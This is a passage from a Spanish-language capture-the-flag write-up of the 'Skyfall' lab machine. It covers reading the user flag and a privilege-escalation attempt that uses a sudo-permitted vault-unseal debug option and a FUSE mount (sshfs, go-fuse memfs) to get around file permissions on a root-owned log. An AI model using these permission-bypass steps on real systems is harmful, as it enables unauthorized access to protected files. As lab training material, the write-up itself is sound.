+</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 9</span><span><span style="color:#f00"></span>This system has been minimized by removing packages and content that are
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">10</span><span>not required on a system that users do not log into.
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">11</span><span><span style="color:#f00">
+</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">12</span><span><span style="color:#f00"></span>To restore this content, you can run the &#39;unminimize&#39; command.
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">13</span><span>Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">14</span><span><span style="color:#f00">
+</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">15</span><span><span style="color:#f00"></span>Last login: Thu Sep  5 17:40:53 2024 from 10.10.14.125
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">16</span><span>askyy@skyfall:~$ id
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">17</span><span>uid=1000(askyy) gid=1000(askyy) groups=1000(askyy)
+</span></span></code></pre></div>
+<p>Podemos ver la flag de usuario.</p>
+
+
+
+
+
+
+<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">1</span><span>askyy@skyfall:~$ cat user.txt 
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">2</span><span>a91436efa69ab...
+</span></span></code></pre></div>
+<h1 id="privilege-escalation">Privilege Escalation</h1>
+<h2 id="exploiting-vault-unseal">Exploiting Vault-Unseal</h2>
+<p>Vemos que el usuario <code>askyy</code> tiene los siguientes permisos para ejecutar como el usuario que quiera y sin contraseña.</p>
+
+
+
+
+
+
+<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">1</span><span>askyy@skyfall:~$ sudo -l
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">2</span><span>Matching Defaults entries for askyy on skyfall:
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">3</span><span>    env_reset, mail_badpass,
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">4</span><span>    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">5</span><span><span style="color:#f00">
+</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">6</span><span><span style="color:#f00"></span>User askyy may run the following commands on skyfall:
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">7</span><span>    (ALL : ALL) NOPASSWD: /root/vault/vault-unseal ^-c /etc/vault-unseal.yaml -[vhd]+$
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">8</span><span>    (ALL : ALL) NOPASSWD: /root/vault/vault-unseal -c /etc/vault-unseal.yaml
+</span></span></code></pre></div>
+<p>Como responde a la expresión regular <code>-[vhd]+</code> podemos ver varios parámetros, por ejemplo la ayuda.</p>
+
+
+
+
+
+
+<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 1</span><span>askyy@skyfall:~$ sudo /root/vault/vault-unseal -c /etc/vault-unseal.yaml -h
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 2</span><span>Usage:
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 3</span><span>  vault-unseal [OPTIONS]
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 4</span><span><span style="color:#f00">
+</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 5</span><span><span style="color:#f00"></span>Application Options:
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 6</span><span>  -v, --verbose        enable verbose output
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 7</span><span>  -d, --debug          enable debugging output to file (extra logging)
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 8</span><span>  -c, --config=PATH    path to configuration file
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 9</span><span><span style="color:#f00">
+</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">10</span><span><span style="color:#f00"></span>Help Options:
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">11</span><span>  -h, --help           Show this help message
+</span></span></code></pre></div>
+<p>Si probamos el parámetro <code>-d</code> para activar el modo depuración.</p>
+
+
+
+
+
+
+<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">1</span><span>askyy@skyfall:~$ sudo /root/vault/vault-unseal -c /etc/vault-unseal.yaml -d
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">2</span><span>[&gt;] Checking seal status
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">3</span><span>[+] Vault sealed: false
+</span></span></code></pre></div>
+<p>Nos damos cuenta de que genera un fichero <code>debug.log</code> del usuario <code>root</code> el cual no tenemos permisos sobre el.</p>
+
+
+
+
+
+
+<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 1</span><span>askyy@skyfall:~$ ls -la
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 2</span><span>total 36
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 3</span><span>drwxr-x--- 4 askyy askyy 4096 Sep  5 17:45 .
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 4</span><span>drwxr-xr-x 3 root  root  4096 Jan 19  2024 ..
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 5</span><span>lrwxrwxrwx 1 askyy askyy    9 Nov  9  2023 .bash_history -&gt; /dev/null
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 6</span><span>-rw-r--r-- 1 askyy askyy  220 Jan  6  2022 .bash_logout
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 7</span><span>-rw-r--r-- 1 askyy askyy 3771 Nov  9  2023 .bashrc
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 8</span><span>drwx------ 2 askyy askyy 4096 Oct  9  2023 .cache
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 9</span><span>-rw-r--r-- 1 askyy askyy  807 Jan  6  2022 .profile
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">10</span><span>drwx------ 2 askyy askyy 4096 Jan 18  2024 .ssh
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">11</span><span>-rw------- 1 root  root   555 Sep  5 17:45 debug.log
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">12</span><span>-rw-r----- 1 root  askyy   33 Sep  5 15:54 user.txt
+</span></span></code></pre></div>
+<p>Además tampoco podíamos acceder al fichero <code>/etc/vault-unseal.yml</code></p>
+
+
+
+
+
+
+<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">1</span><span>askyy@skyfall:~$ cat /etc/vault-unseal.yaml
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">2</span><span>cat: /etc/vault-unseal.yaml: Permission denied
+</span></span></code></pre></div>
+<p>Después de pensar un rato no se me ocurrió nada y tuve que mirar una pista.</p>
+<p>Me acuerdo de una máquina donde encontrábamos un recurso NFS que podíamos montar, esta era la máquina <code>Squashed</code> y esto pasaba porque ocurría en NFS un UID/GUID mismatch.</p>
+<blockquote>
+<p>If you mount a folder which contains <strong>files or folders only accesible by some user</strong> (by <strong>UID</strong>). You can <strong>create</strong> <strong>locally</strong> a user with that <strong>UID</strong> and using that <strong>user</strong> you will be able to <strong>access</strong> the file/folder.</p>
+</blockquote>
+<p>Lo que vamos a hacer es algo similar</p>
+<h2 id="bypass-unix-permissions-with-fuse-mount">Bypass Unix permissions with FUSE mount</h2>
+<p>Como controlamos el directorio en el que nos encontramos, podemos crear un FUSE mount con <code>sshfs</code> que nos permitirá montar de forma local en nuestro equipo un sistema de ficheros utilizando SFTP a un equipo remoto ya que la mayoría de los servidores SSH soportan y tienen habilitados por defecto el acceso SFTP. Cuando hagamos esto conseguiremos que todos los archivos del directorio en el que nos encontramos (<code>/home/askyy</code>) sean del usuario <code>askyy</code> , incluido el fichero <code>debug.log</code> por lo cual podríamos leer su contenido.</p>
+<p>Nos encontramos <a href="https://stackoverflow.com/questions/11988464/mount-remote-file-system-using-sshfs-and-without-root-permission">este post de StackOverflow</a> que habla de como realizar esta montura y sin necesidad de permisos de superusuarios.</p>
+<p>Instalamos <code>sshfs</code></p>
+
+
+
+
+
+
+<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">1</span><span> sudo apt-get install sshfs
+</span></span></code></pre></div>
+<p>Creamos una carpeta para montar.</p>
+
+
+
+
+
+
+<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">1</span><span>$ mkdir /tmp/askyy
+</span></span></code></pre></div>
+<p>Al intentar montar nos sale un error.</p>
+
+
+
+
+
+
+<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">1</span><span>$ sshfs -o allow_other askyy@10.129.230.158:/home/askyy /tmp/askyy -d
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">2</span><span>SSHFS version 3.7.3
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">3</span><span>fusermount3: option allow_other only allowed if &#39;user_allow_other&#39; is set in /etc/fuse.conf
+</span></span></code></pre></div>
+<p>Vamos a cambiar la opción <code>user_allow_other</code> de la configuración <code>/etc/fuse.conf</code>.</p>
+<p>Simplemente desmarcamos la línea 10.
+<img src="images/Screenshot_20.png" alt="Write-up Image"></p>
+<p>En la máquina víctima ya está desmarcada.</p>
+
+
+
+
+
+
+<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 1</span><span>askyy@skyfall:~$ cat /etc/fuse.conf 
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 2</span><span># The file /etc/fuse.conf allows <span style="color:#fff;font-weight:bold">for</span> the following parameters:
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 3</span><span>#
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 4</span><span><span style="color:#007f7f"># user_allow_other - Using the allow_other mount option works fine as root, in</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 5</span><span># order to have it work as user you need user_allow_other in /etc/fuse.conf as
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 6</span><span># well. (This option allows users to use the allow_other option.) You need
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 7</span><span># allow_other <span style="color:#fff;font-weight:bold">if</span> you want users other than the owner to access a mounted fuse.
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 8</span><span># This option must appear on a line by itself. There is no value, just the
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 9</span><span># presence of the option.
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">10</span><span><span style="color:#f00">
+</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">11</span><span><span style="color:#f00"></span>user_allow_other
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">12</span><span><span style="color:#f00">
+</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">13</span><span><span style="color:#f00">
+</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">14</span><span><span style="color:#f00"></span># mount_max = n - this option sets the maximum number of mounts.
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">15</span><span># Currently (2014) it must be typed exactly as shown
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">16</span><span># (with a single space before and after the equals sign).
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">17</span><span><span style="color:#f00">
+</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">18</span><span><span style="color:#f00"></span>#mount_max = <span style="color:#ff0;font-weight:bold">1000</span>
+</span></span></code></pre></div>
+<p>Nos pide una contraseña.</p>
+
+
+
+
+
+
+<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">1</span><span>$ sshfs -o allow_other askyy@10.129.230.158:/home/askyy /tmp/askyy -d
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">2</span><span>SSHFS version 3.7.3
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">3</span><span>executing &lt;ssh&gt; &lt;-x&gt; &lt;-a&gt; &lt;-oClearAllForwardings=yes&gt; &lt;-2&gt; &lt;askyy@10.129.230.158&gt; &lt;-s&gt; &lt;sftp&gt;
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">4</span><span>(askyy@10.129.230.158) Password:
+</span></span></code></pre></div>
+<p>Vamos a generar un token OTP como antes.</p>
+
+
+
+
+
+
+<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">1</span><span>$ vault ssh -role dev_otp_key_role askyy@10.129.230.158
+</span></span></code></pre></div>
+<p>Nos copiamos el token y lo pegamos para montar el sistema de ficheros.
+<img src="images/Screenshot_21.png" alt="Write-up Image"></p>
+<p>Ahora si accedemos a <code>/tmp/askyy</code> vemos que <code>debug.log</code> es del usuario <code>root</code>, pero como estamos en nuestro equipo local simplemente podemos hacer un <code>sudo cat debug.log</code> y podemos leer el archivo.</p>
+
+
+
+
+
+
+<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 1</span><span>$ ls -la
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 2</span><span>total 36
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 3</span><span>drwxr-x--- 1 pointedsec lpadmin 4096 sep  5 19:45 .
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 4</span><span>drwxrwxrwt 1 root       root    1254 sep  5 20:26 ..
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 5</span><span>lrwxrwxrwx 1 pointedsec lpadmin    9 nov  9  2023 .bash_history -&gt; /dev/null
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 6</span><span>-rw-r--r-- 1 pointedsec lpadmin  220 ene  6  2022 .bash_logout
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 7</span><span>-rw-r--r-- 1 pointedsec lpadmin 3771 nov  9  2023 .bashrc
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 8</span><span>drwx------ 1 pointedsec lpadmin 4096 oct  9  2023 .cache
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 9</span><span>-rw------- 1 root       root     555 sep  5 19:45 debug.log
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">10</span><span>-rw-r--r-- 1 pointedsec lpadmin  807 ene  6  2022 .profile
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">11</span><span>drwx------ 1 pointedsec lpadmin 4096 ene 18  2024 .ssh
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">12</span><span>-rw-r----- 1 root       lpadmin   33 sep  5 17:54 user.txt
+</span></span></code></pre></div>
+<p>Esto no funciona y me di cuenta de que entendí mal en concepto, lo que queremos hacer es aprovecharnos de que la opción <code>user_allow_other</code> está desmarcada en la máquina víctima, por lo cual esto lo tenemos que hacer en local en la máquina víctima.</p>
+<p>Para esto podemos utilizar <a href="https://github.com/hanwen/go-fuse">este repositorio de Github</a> el cual tiene varios ejemplos programados en go, uno de ellos es <code>memfs</code>.</p>
+<p>Sirve para hacer lo mismo que <code>sshfs</code></p>
+<p>Clonamos el repositorio en nuestra máquina.</p>
+
+
+
+
+
+
+<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">1</span><span>$ git clone https://github.com/hanwen/go-fuse
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">2</span><span>Cloning into &#39;go-fuse&#39;...
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">3</span><span>remote: Enumerating objects: 13238, done.
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">4</span><span>remote: Counting objects: 100% (3744/3744), done.
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">5</span><span>remote: Compressing objects: 100% (775/775), done.
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">6</span><span>remote: Total 13238 (delta 3208), reused 3029 (delta 2965), pack-reused 9494 (from 1)
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">7</span><span>Receiving objects: 100% (13238/13238), 3.92 MiB | 757.00 KiB/s, done.
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">8</span><span>Resolving deltas: 100% (8781/8781), done.
+</span></span></code></pre></div>
+<p>Nos dirigimos donde está esta herramienta.</p>
+
+
+
+
+
+
+<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">1</span><span>$ <span style="color:#fff;font-weight:bold">cd</span> go-fuse/example/memfs/
+</span></span></code></pre></div>
+<p>Compilamos la herramienta.</p>
+
+
+
+
+
+
+<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">1</span><span>$ go build
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">2</span><span>go: downloading golang.org/x/sys v0.0.0-20220520151302-bc2c85ada10a
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">3</span><span>┌─[192.168.1.52]─[pointedsec@parrot]─[~/Desktop/skyfall/content/go-fuse/example/memfs]
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">4</span><span>└──╼ [★]$ ls -la
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">5</span><span>total 3208
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">6</span><span>drwxr-xr-x 1 pointedsec pointedsec      24 sep  5 20:42 .
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">7</span><span>drwxr-xr-x 1 pointedsec pointedsec     158 sep  5 20:41 ..
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">8</span><span>-rw-r--r-- 1 pointedsec pointedsec     957 sep  5 20:41 main.go
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">9</span><span>-rwxr-xr-x 1 pointedsec pointedsec 3280384 sep  5 20:42 memfs
+</span></span></code></pre></div>
+<p>Ahora en la máquina víctima nos descargamos esta herramienta ya compilada.</p>
+
+
+
+
+
+
